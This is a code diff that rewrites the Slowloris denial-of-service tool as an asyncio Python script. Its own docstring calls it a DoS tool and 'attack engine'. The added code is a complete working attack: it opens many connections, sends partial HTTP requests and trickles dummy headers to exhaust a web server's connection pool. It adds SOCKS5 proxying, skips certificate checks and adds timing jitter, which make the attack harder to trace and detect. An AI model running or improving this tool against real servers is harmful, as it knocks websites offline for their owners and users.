@@ -1,230 +1,384 @@
 #!/usr/bin/env python3
+"""Slowloris - Low bandwidth DoS tool rewritten with modern Python practices.
+
+This implementation uses asyncio for maximum concurrent connection handling,
+proper resource management, and clean architecture without monkey-patching.
+"""
+
+from __future__ import annotations
+
 import argparse
+import asyncio
 import logging
 import random
+import signal
 import socket
+import ssl
 import sys
 import time
+from dataclasses import dataclass
+from typing import Optional, Set
 
-parser = argparse.ArgumentParser(
-    description="Slowloris, low bandwidth stress test tool for websites"
-)
-parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-parser.add_argument(
-    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
-)
-parser.add_argument(
-    "-s",
-    "--sockets",
-    default=150,
-    help="Number of sockets to use in the test",
-    type=int,
-)
-parser.add_argument(
-    "-v",
-    "--verbose",
-    dest="verbose",
-    action="store_true",
-    help="Increases logging",
-)
-parser.add_argument(
-    "-ua",
-    "--randuseragents",
-    dest="randuseragent",
-    action="store_true",
-    help="Randomizes user-agents with each request",
-)
-parser.add_argument(
-    "-x",
-    "--useproxy",
-    dest="useproxy",
-    action="store_true",
-    help="Use a SOCKS5 proxy for connecting",
-)
-parser.add_argument(
-    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
-)
-parser.add_argument(
-    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
-)
-parser.add_argument(
-    "--https",
-    dest="https",
-    action="store_true",
-    help="Use HTTPS for the requests",
-)
-parser.add_argument(
-    "--sleeptime",
-    dest="sleeptime",
-    default=15,
-    type=int,
-    help="Time to sleep between each header sent.",
-)
-parser.set_defaults(verbose=False)
-parser.set_defaults(randuseragent=False)
-parser.set_defaults(useproxy=False)
-parser.set_defaults(https=False)
-args = parser.parse_args()
+__version__ = "0.3.0"
 
-if len(sys.argv) <= 1:
-    parser.print_help()
-    sys.exit(1)
-
-if not args.host:
-    print("Host required!")
-    parser.print_help()
-    sys.exit(1)
-
-if args.useproxy:
-    # Tries to import to external "socks" library
-    # and monkey patches socket.socket to connect over
-    # the proxy by default
-    try:
-        import socks
-
-        socks.setdefaultproxy(
-            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
-        )
-        socket.socket = socks.socksocket
-        logging.info("Using SOCKS5 proxy for connecting...")
-    except ImportError:
-        logging.error("Socks Proxy Library Not Available!")
-        sys.exit(1)
-
-logging.basicConfig(
-    format="[%(asctime)s] %(message)s",
-    datefmt="%d-%m-%Y %H:%M:%S",
-    level=logging.DEBUG if args.verbose else logging.INFO,
-)
-
-
-def send_line(self, line):
-    line = f"{line}\r\n"
-    self.send(line.encode("utf-8"))
-
-
-def send_header(self, name, value):
-    self.send_line(f"{name}: {value}")
-
-
-if args.https:
-    logging.info("Importing ssl module")
-    import ssl
-
-    setattr(ssl.SSLSocket, "send_line", send_line)
-    setattr(ssl.SSLSocket, "send_header", send_header)
-
-list_of_sockets = []
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+# Modern user agents (2024)
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
 ]
 
-setattr(socket.socket, "send_line", send_line)
-setattr(socket.socket, "send_header", send_header)
+# Optional SOCKS5 support
+try:
+    from python_socks import ProxyType
+    from python_socks.async_.asyncio import Proxy
+    _PROXY_AVAILABLE = True
+except ImportError:
+    _PROXY_AVAILABLE = False
 
 
-def init_socket(ip: str):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(4)
-
-    if args.https:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=args.host)
-
-    s.connect((ip, args.port))
-
-    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
-
-    ua = user_agents[0]
-    if args.randuseragent:
-        ua = random.choice(user_agents)
-
-    s.send_header("User-Agent", ua)
-    s.send_header("Accept-language", "en-US,en,q=0.5")
-    return s
+@dataclass(frozen=True)
+class Config:
+    """Configuration for Slowloris attack."""
+    host: str
+    port: int = 80
+    sockets: int = 150
+    verbose: bool = False
+    randuseragent: bool = False
+    useproxy: bool = False
+    proxy_host: str = "127.0.0.1"
+    proxy_port: int = 8080
+    https: bool = False
+    sleeptime: float = 15.0
+    jitter: float = 3.0
 
 
-def slowloris_iteration():
-    logging.info("Sending keep-alive headers...")
-    logging.info("Socket count: %s", len(list_of_sockets))
-
-    # Try to send a header line to each socket
-    for s in list(list_of_sockets):
-        try:
-            s.send_header("X-a", random.randint(1, 5000))
-        except socket.error:
-            list_of_sockets.remove(s)
-
-    # Some of the sockets may have been closed due to errors or timeouts.
-    # Re-create new sockets to replace them until we reach the desired number.
-
-    diff = args.sockets - len(list_of_sockets)
-    if diff <= 0:
-        return
-
-    logging.info("Creating %s new sockets...", diff)
-    for _ in range(diff):
-        try:
-            s = init_socket(args.host)
-            if not s:
+class Slowloris:
+    """Asyncio-based Slowloris attack engine.
+    
+    Manages multiple concurrent connections to exhaust a target server's
+    connection pool by sending partial HTTP requests and keeping them alive
+    with periodic dummy headers.
+    """
+    
+    def __init__(self, config: Config) -> None:
+        self.config = config
+        self._shutdown = asyncio.Event()
+        self._tasks: Set[asyncio.Task[None]] = set()
+        self._ssl: Optional[ssl.SSLContext] = None
+        
+        if config.https:
+            self._ssl = ssl.create_default_context()
+            self._ssl.check_hostname = False
+            self._ssl.verify_mode = ssl.CERT_NONE
+        
+        # Statistics
+        self._connections_created = 0
+        self._connections_failed = 0
+    
+    async def _open_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
+        """Establish a connection to the target, optionally via SOCKS5 proxy."""
+        if self.config.useproxy:
+            if not _PROXY_AVAILABLE:
+                raise RuntimeError(
+                    "SOCKS5 proxy support requires 'python-socks' package. "
+                    "Install it with: pip install python-socks"
+                )
+            proxy = Proxy.create(
+                proxy_type=ProxyType.SOCKS5,
+                host=self.config.proxy_host,
+                port=self.config.proxy_port,
+            )
+            sock = await proxy.connect(
+                dest_host=self.config.host,
+                dest_port=self.config.port,
+                timeout=10,
+            )
+            return await asyncio.wait_for(
+                asyncio.open_connection(sock=sock, ssl=self._ssl),
+                timeout=10.0,
+            )
+        
+        # Resolve address with IPv6 support
+        addrinfo = socket.getaddrinfo(
+            self.config.host,
+            self.config.port,
+            socket.AF_UNSPEC,
+            socket.SOCK_STREAM,
+        )
+        
+        last_error: Optional[Exception] = None
+        for family, socktype, proto, canonname, sockaddr in addrinfo:
+            try:
+                return await asyncio.wait_for(
+                    asyncio.open_connection(sockaddr[0], self.config.port, ssl=self._ssl),
+                    timeout=10.0,
+                )
+            except OSError as e:
+                last_error = e
                 continue
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
+        
+        if last_error:
+            raise last_error
+        raise OSError(f"Could not connect to {self.config.host}:{self.config.port}")
+    
+    def _get_user_agent(self) -> str:
+        """Return a user agent string."""
+        if self.config.randuseragent:
+            return random.choice(USER_AGENTS)
+        return USER_AGENTS[0]
+    
+    async def _send_initial_request(self, writer: asyncio.StreamWriter) -> None:
+        """Send the initial partial HTTP request."""
+        query = random.randint(0, 9999)
+        lines = [
+            f"GET /?{query} HTTP/1.1\r\n",
+            f"Host: {self.config.host}\r\n",
+            f"User-Agent: {self._get_user_agent()}\r\n",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+            "Accept-Language: en-US,en;q=0.5\r\n",
+            "Accept-Encoding: gzip, deflate\r\n",
+            "Connection: keep-alive\r\n",
+        ]
+        for line in lines:
+            writer.write(line.encode())
+        await writer.drain()
+    
+    async def _worker(self) -> None:
+        """Maintain a single Slowloris connection."""
+        retry_delay = 1.0
+        
+        while not self._shutdown.is_set():
+            writer: Optional[asyncio.StreamWriter] = None
+            try:
+                reader, writer = await self._open_connection()
+                self._connections_created += 1
+                await self._send_initial_request(writer)
+                retry_delay = 1.0  # Reset on success
+                
+                while not self._shutdown.is_set():
+                    # Send keep-alive header
+                    if writer and not writer.is_closing():
+                        header_val = random.randint(1, 5000)
+                        writer.write(f"X-a: {header_val}\r\n".encode())
+                        await writer.drain()
+                    
+                    # Calculate sleep time with jitter
+                    if self.config.jitter > 0:
+                        sleep_time = self.config.sleeptime + random.uniform(
+                            -self.config.jitter, self.config.jitter
+                        )
+                    else:
+                        sleep_time = self.config.sleeptime
+                    
+                    # Wait with early exit on shutdown
+                    try:
+                        await asyncio.wait_for(
+                            self._shutdown.wait(),
+                            timeout=sleep_time
+                        )
+                    except asyncio.TimeoutError:
+                        pass  # Normal timeout, continue loop
+                    
+                    # Check if connection was closed by server
+                    if writer and writer.is_closing():
+                        break
+                        
+            except asyncio.TimeoutError:
+                self._connections_failed += 1
+                logging.debug("Connection timeout")
+            except ConnectionRefusedError:
+                self._connections_failed += 1
+                logging.debug("Connection refused")
+            except OSError as e:
+                self._connections_failed += 1
+                logging.debug("Connection error: %s", e)
+            except RuntimeError as e:
+                logging.error("Runtime error: %s", e)
+                raise
+            except Exception as e:
+                logging.debug("Unexpected error: %s", e)
+            finally:
+                if writer and not writer.is_closing():
+                    writer.close()
+                    await writer.wait_closed()
+            
+            # Exponential backoff with cap
+            if not self._shutdown.is_set():
+                await asyncio.sleep(retry_delay)
+                retry_delay = min(retry_delay * 1.5, 10.0)
+    
+    async def run(self) -> None:
+        """Run the Slowloris attack."""
+        logging.info(
+            "Starting attack on %s:%s with %d sockets",
+            self.config.host,
+            self.config.port,
+            self.config.sockets
+        )
+        
+        # Create worker tasks
+        for _ in range(self.config.sockets):
+            task = asyncio.create_task(self._worker())
+            self._tasks.add(task)
+            task.add_done_callback(self._tasks.discard)
+        
+        # Wait for shutdown signal
+        await self._shutdown.wait()
+        
+        # Graceful shutdown
+        logging.info("Shutting down connections...")
+        for task in self._tasks:
+            task.cancel()
+        
+        if self._tasks:
+            await asyncio.gather(*self._tasks, return_exceptions=True)
+        
+        logging.info(
+            "Attack complete. Created: %d, Failed: %d",
+            self._connections_created,
+            self._connections_failed
+        )
+    
+    def stop(self) -> None:
+        """Signal shutdown."""
+        self._shutdown.set()
 
 
-def main():
-    ip = args.host
-    socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+def setup_logging(verbose: bool) -> None:
+    """Configure logging."""
+    level = logging.DEBUG if verbose else logging.INFO
+    format_str = "[%(asctime)s] %(message)s"
+    date_format = "%d-%m-%Y %H:%M:%S"
+    logging.basicConfig(level=level, format=format_str, datefmt=date_format)
 
-    logging.info("Creating sockets...")
-    for _ in range(socket_count):
-        try:
-            logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
-        except socket.error as e:
-            logging.debug(e)
-            break
-        list_of_sockets.append(s)
 
-    while True:
-        try:
-            slowloris_iteration()
-        except (KeyboardInterrupt, SystemExit):
-            logging.info("Stopping Slowloris")
-            break
-        except Exception as e:
-            logging.debug("Error in Slowloris iteration: %s", e)
-        logging.debug("Sleeping for %d seconds", args.sleeptime)
-        time.sleep(args.sleeptime)
+def parse_args() -> Config:
+    """Parse command line arguments."""
+    parser = argparse.ArgumentParser(
+        description="Slowloris, low bandwidth stress test tool for websites",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument(
+        "host",
+        nargs="?",
+        help="Host to perform stress test on",
+    )
+    parser.add_argument(
+        "-p", "--port",
+        default=80,
+        type=int,
+        help="Port of webserver, usually 80 or 443",
+    )
+    parser.add_argument(
+        "-s", "--sockets",
+        default=150,
+        type=int,
+        help="Number of concurrent connections to maintain",
+    )
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose logging",
+    )
+    parser.add_argument(
+        "-ua", "--randuseragents",
+        action="store_true",
+        help="Randomize user-agent for each connection",
+    )
+    parser.add_argument(
+        "-x", "--useproxy",
+        action="store_true",
+        help="Use SOCKS5 proxy for connections",
+    )
+    parser.add_argument(
+        "--proxy-host",
+        default="127.0.0.1",
+        help="SOCKS5 proxy host (default: 127.0.0.1)",
+    )
+    parser.add_argument(
+        "--proxy-port",
+        default=8080,
+        type=int,
+        help="SOCKS5 proxy port (default: 8080)",
+    )
+    parser.add_argument(
+        "--https",
+        action="store_true",
+        help="Use HTTPS for connections",
+    )
+    parser.add_argument(
+        "--sleeptime",
+        default=15,
+        type=float,
+        help="Seconds between keep-alive headers (default: 15)",
+    )
+    parser.add_argument(
+        "--jitter",
+        default=3,
+        type=float,
+        help="Random jitter added to sleep time (default: 3)",
+    )
+    parser.add_argument(
+        "--version",
+        action="version",
+        version=f"%(prog)s {__version__}",
+    )
+    
+    args = parser.parse_args()
+    
+    if not args.host:
+        parser.print_help()
+        sys.exit(1)
+    
+    return Config(
+        host=args.host,
+        port=args.port,
+        sockets=args.sockets,
+        verbose=args.verbose,
+        randuseragent=args.randuseragents,
+        useproxy=args.useproxy,
+        proxy_host=args.proxy_host,
+        proxy_port=args.proxy_port,
+        https=args.https,
+        sleeptime=args.sleeptime,
+        jitter=args.jitter,
+    )
+
+
+def main() -> None:
+    """Main entry point."""
+    config = parse_args()
+    setup_logging(config.verbose)
+    
+    # Setup signal handlers
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    slowloris = Slowloris(config)
+    
+    def signal_handler(signum, frame):
+        logging.info("Received interrupt signal, shutting down...")
+        slowloris.stop()
+    
+    # Register signal handlers
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
+    try:
+        loop.run_until_complete(slowloris.run())
+    except KeyboardInterrupt:
+        logging.info("Interrupted, shutting down...")
+        slowloris.stop()
+        loop.run_until_complete(asyncio.sleep(0.5))
+    finally:
+        loop.close()
 
 
 if __name__ == "__main__":
